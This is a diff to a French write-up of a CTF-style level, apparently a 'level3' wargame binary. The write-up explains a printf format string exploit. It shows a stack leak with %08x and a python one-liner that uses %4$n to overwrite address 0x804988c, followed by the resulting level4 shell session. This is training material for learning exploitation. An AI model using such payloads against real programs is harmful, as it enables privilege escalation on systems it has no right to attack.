@@ -50,11 +50,13 @@
 
 - `./level3` et `AAA0_%08x.%08x.%08x.%08x`
   > AAA0_00000200.b7fd1ac0.b7ff37d0.30414141
-- Pour écraser `0x804988c` (`\x8c\x98\x04\x08`), on peut utiliser l'option `%n` de printf (avec `$4` pour cibler la 4 ème adresse de la stack) :
+- Pour écraser `0x804988c` (`\x8c\x98\x04\x08`), on peut utiliser l'option `%n` *(qui écrit le nombre de caractères précédents)* de printf (avec `$4` pour cibler la 4 ème adresse de la stack) :
     `(python -c 'print("\x8c\x98\x04\x08"+60*"A"+"%4$n")' ; cat -) | ./level3`
     ```
     �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     Wait what?!
+    whoami
+    level4
     pwd
     /home/user/level3
     cd ../level4
